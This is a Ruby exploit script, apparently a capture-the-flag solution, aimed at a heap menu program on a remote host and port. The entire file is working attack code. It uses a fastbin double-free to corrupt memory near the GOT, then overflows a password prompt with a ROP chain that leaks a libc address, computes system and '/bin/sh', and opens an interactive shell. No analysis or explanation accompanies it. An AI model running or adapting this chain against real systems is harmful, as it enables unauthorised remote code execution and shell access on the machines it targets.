#!/usr/bin/env ruby
require '~/Tools/pwnlib.rb'

local = false #true
if local
	host, port = '127.0.0.1', 4445
	system_offset = 0x41490
	puts_offset = 0x6b990
	sh_offset = 0x13012
else
	host, port = '52.175.144.148', 9901
	system_offset = 0x46590
	puts_offset = 0x6fd60
	sh_offset = 0x156a2
end

def p64(*addr)
	return addr.pack("Q*")
end

def free(number)
	@r.recv_until("$")
        @r.send("2\n")
	@r.recv_until("Free Chunk number: ")
	@r.send("#{number}\n")
	@r.recv_until("Fuck the free Success")
end
def quit()
	@r.recv_until("$")
        @r.send("5\n")
end

def malloc(number, size, data)
	@r.recv_until("$")
	@r.send("1\n")
	@r.recv_until("Allocate Chunk Number: ")
	@r.send("#{number}\n")
	@r.recv_until("Input Size: ")
	@r.send("#{size}\n")
	@r.recv_until("Input Data: ")
	@r.send("#{data}\n")
end
PwnTube.open(host, port) do |r|
	@r = r
=begin
  400cf0:	4c 89 ea             	mov    %r13,%rdx
  400cf3:	4c 89 f6             	mov    %r14,%rsi
  400cf6:	44 89 ff             	mov    %r15d,%edi
  400cf9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  400cfd:	48 83 c3 01          	add    $0x1,%rbx
  400d01:	48 39 eb             	cmp    %rbp,%rbx
  400d04:	75 ea                	jne    400cf0 <__isoc99_scanf@plt+0x680>
  400d06:	48 83 c4 08          	add    $0x8,%rsp
  400d0a:	5b                   	pop    %rbx rbx
  400d0b:	5d                   	pop    %rbp rbp
  400d0c:	41 5c                	pop    %r12 rip
  400d0e:	41 5d                	pop    %r13 rdx
  400d10:	41 5e                	pop    %r14 rsi 
  400d12:	41 5f                	pop    %r15 rdi
  400d14:	c3                   	retq
=end
	pop_rdi_ret = 0x00000000004008a0 #: pop rdi ; ret
	pop_rsi_r15_ret = 0x0000000000400d11 #: pop rsi ; pop r15 ; ret

	puts_got = 0x602020
	libc_start_main_got = 0x602030
	print = 0x400650
	puts = 0x400600
	bss = 0x00603000-0x500

	got = 0x602050#602028 0x602048
	start = 0x400680
	main = 0x400680

	malloc(1, 96, "1")
	malloc(2, 96, "2")
	free(1)	
	free(2)	
	free(1)
	malloc(1, 96, p64(0x60206d))
	malloc(2, 96, "3")
	malloc(3, 96, "4")
	malloc(4, 96, "5"*3)
	
	@r.recv_until("$")
	@r.send("4\n")	
	@r.recv_until("Input password: ")

	payload = "a"*1032
	payload << p64(pop_rdi_ret, puts_got, puts)
	payload << p64(main)
	payload << p64(pop_rdi_ret, puts_got, puts)
	payload << p64(main)
	
	@r.send(payload+"\n")
	puts @r.recv(6).ljust(8,"\0").unpack("Q")[0].to_s(16)
	puts @r.recv(2)
	#payload = "b"*1200
	#@r.send(payload)
	quit()
	puts @r.recv(1)
	libc_base = @r.recv(6).ljust(8,"\0").unpack("Q")[0] - puts_offset
	system = libc_base + system_offset
	sh = libc_base + sh_offset

	@r.recv_until("$")
	@r.send("4\n")	
	puts @r.recv_until("Input password: ")
	
	payload = "b"*1032
	payload << p64(pop_rdi_ret, sh, system)
	@r.send(payload)
	quit()
	@r.interactive()
end
